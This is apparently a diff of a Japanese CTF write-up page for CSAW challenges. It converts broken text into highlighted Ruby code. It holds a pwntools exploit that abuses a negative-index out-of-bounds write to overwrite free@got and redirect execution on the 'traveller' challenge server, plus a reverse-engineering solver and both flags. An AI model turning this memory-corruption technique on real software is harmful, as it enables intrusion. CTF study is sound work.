@@ -201,76 +201,67 @@ z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;interact&lt;/code&gt;&lt;/
 &lt;li&gt;解けなかったのでwriteupを見た&lt;/li&gt;
 &lt;li&gt;Off-by-oneがあるためHeap問題かと思ったら操作対象のインデックスの入力に負数が入力できるOOB問題&lt;/li&gt;
 
-&lt;li&gt;&lt;p&gt;編集コマンドで、&lt;code&gt;-50&lt;/code&gt; をするとfree@gotを書き換えられたのでこれを使って&lt;code&gt;cat_flag&lt;/code&gt;関数に飛ばす
-```ruby
-#!/usr/bin/env ruby&lt;/p&gt;
+&lt;li&gt;&lt;p&gt;編集コマンドで、&lt;code&gt;-50&lt;/code&gt; をするとfree@gotを書き換えられたのでこれを使って&lt;code&gt;cat_flag&lt;/code&gt;関数に飛ばす&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;
+&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# coding: ascii-8bit&lt;/span&gt;
+&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pwn&amp;#39;&lt;/span&gt;
+$z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;pwn.chal.csaw.io&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;1003&lt;/span&gt;
+&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#elf = ELF.new &amp;#34;./traveller&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#libc = ELF.new &amp;#34;./libc-2.23.so&amp;#34;&lt;/span&gt;
+context&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;log_level &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#19177c&#34;&gt;:debug&lt;/span&gt;
+&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;z&lt;/span&gt;; $z; &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;
+&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;add&lt;/span&gt;(dist, dest)
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline dist&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;to_s
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline dest
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;
+&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;change&lt;/span&gt;(dist, dest)
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;2&amp;#34;&lt;/span&gt;
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline dist&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;to_s
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;send dest
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;
+&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;delete&lt;/span&gt;(dist)
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;3&amp;#34;&lt;/span&gt;
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline dist&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;to_s
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;
+&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;check&lt;/span&gt;(dist)
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;4&amp;#34;&lt;/span&gt;
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;gt;&amp;#34;&lt;/span&gt;
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline dist&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;to_s
+&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;return&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;
+tmp &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;
+stack_address &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; tmp&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;match(&lt;span style=&#34;color:#b68&#34;&gt;/.\n(.*) \n\n/&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;].&lt;/span&gt;to_i(&lt;span style=&#34;color:#666&#34;&gt;16&lt;/span&gt;)
+add(&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;AAAAAAAA&amp;#34;&lt;/span&gt;)
+change(&lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;50&lt;/span&gt;, p64(&lt;span style=&#34;color:#666&#34;&gt;0x4008b6&lt;/span&gt;))
+&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; delete(&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
 
-&lt;h1 id=&#34;coding-ascii-8bit&#34;&gt;coding: ascii-8bit&lt;/h1&gt;
-
-&lt;p&gt;require &amp;lsquo;pwn&amp;rsquo;&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;flag{h0pe_y0u_3nj0y_ur_j0urn3y}&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;$z = Sock.new &amp;ldquo;pwn.chal.csaw.io&amp;rdquo;, 1003
-#elf = ELF.new &amp;ldquo;./traveller&amp;rdquo;
-#libc = ELF.new &amp;ldquo;./libc-2.23.so&amp;rdquo;&lt;/p&gt;
+&lt;h2 id=&#34;rev&#34;&gt;Rev&lt;/h2&gt;
 
-&lt;p&gt;context.log_level = :debug
-def z; $z; end&lt;/p&gt;
+&lt;h3 id=&#34;beleaf&#34;&gt;Beleaf&lt;/h3&gt;
 
-&lt;p&gt;def add(dist, dest)
-  z.sendline &amp;ldquo;1&amp;rdquo;
-  z.recvuntil &amp;ldquo;&amp;gt; &amp;ldquo;
-  z.sendline dist.to_s
-  z.recvuntil &amp;ldquo;: &amp;ldquo;
-  z.sendline dest
-  z.recvuntil &amp;ldquo;&amp;gt; &amp;ldquo;
-end&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;バイナリ中にFLAGに使われる文字列とインデックスの配列があるので、それを引っこ抜いてきて実行する&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;
 
-&lt;p&gt;def change(dist, dest)
-  z.sendline &amp;ldquo;2&amp;rdquo;
-  z.recvuntil &amp;ldquo;: &amp;ldquo;
-  z.sendline dist.to_s
-  z.send dest
-  z.recvuntil &amp;ldquo;&amp;gt; &amp;ldquo;
-end&lt;/p&gt;
+idxs &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;0x1&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x9&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x11&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x27&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x02&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x03&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x8&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x9&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x11&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x1&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x3&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x13&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x4&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x3&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x5&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x15&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x2e&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0xa&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x3&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0xa&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x3&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x1&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x2e&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x16&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x2e&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0xa&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x6&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt;
 
-&lt;p&gt;def delete(dist)
-  z.sendline &amp;ldquo;3&amp;rdquo;
-  z.recvuntil &amp;ldquo;: &amp;ldquo;
-  z.sendline dist.to_s
-  z.recvuntil &amp;ldquo;&amp;gt; &amp;ldquo;
-end&lt;/p&gt;
+flag &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;0x77&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x66&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x7b&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x5f&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x6e&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x79&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x7d&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x62&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x6c&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x72&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x61&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x65&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x69&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x6f&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x74&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x67&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x75&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;].&lt;/span&gt;map(&lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#19177c&#34;&gt;:chr&lt;/span&gt;)
 
-&lt;p&gt;def check(dist)
-  z.sendline &amp;ldquo;4&amp;rdquo;
-  z.recvuntil &amp;ldquo;&amp;gt;&amp;rdquo;
-  z.sendline dist.to_s
-  return z.recvuntil &amp;ldquo;&amp;gt; &amp;ldquo;
-end&lt;/p&gt;
-
-&lt;p&gt;tmp = z.recvuntil &amp;ldquo;&amp;gt; &amp;ldquo;
-stack_address = tmp.match(/.\n(.*) \n\n/)[1].to_i(16)&lt;/p&gt;
-
-&lt;p&gt;add(1, &amp;ldquo;AAAAAAAA&amp;rdquo;)
-change(-50, p64(0x4008b6))
-puts delete(0)&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;- **flag{h0pe_y0u_3nj0y_ur_j0urn3y}**
-
-## Rev
-
-### Beleaf
-
-- バイナリ中にFLAGに使われる文字列とインデックスの配列があるので、それを引っこ抜いてきて実行する
-```ruby
-#!/usr/bin/env ruby
-
-idxs = [0x1, 0x9, 0x11, 0x27, 0x02, 0x00, 0x12, 0x03, 0x8, 0x12, 0x9, 0x12, 0x11, 0x1, 0x3, 0x13, 0x4, 0x3, 0x5, 0x15, 0x2e, 0xa, 0x3, 0xa, 0x12, 0x3, 0x1, 0x2e, 0x16, 0x2e, 0xa, 0x12, 0x6]
-
-flag = [0x77, 0x66, 0x7b, 0x5f, 0x6e, 0x79, 0x7d, 0x20, 0x62, 0x6c, 0x72, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x61, 0x65, 0x69, 0x20, 0x6f, 0x74, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x67, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x75].map(&amp;amp;:chr)
-
-idxs.each do |i|
-  print flag[i]
-end&lt;/pre&gt;&lt;/div&gt;
+idxs&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;each &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;do&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;|&lt;/span&gt;i&lt;span style=&#34;color:#666&#34;&gt;|&lt;/span&gt;
+  &lt;span style=&#34;color:#008000&#34;&gt;print&lt;/span&gt; flag&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;i&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt;
+&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;flag{we_beleaf_in_your_re_future}&lt;/strong&gt;&lt;/li&gt;
 &lt;/ul&gt;
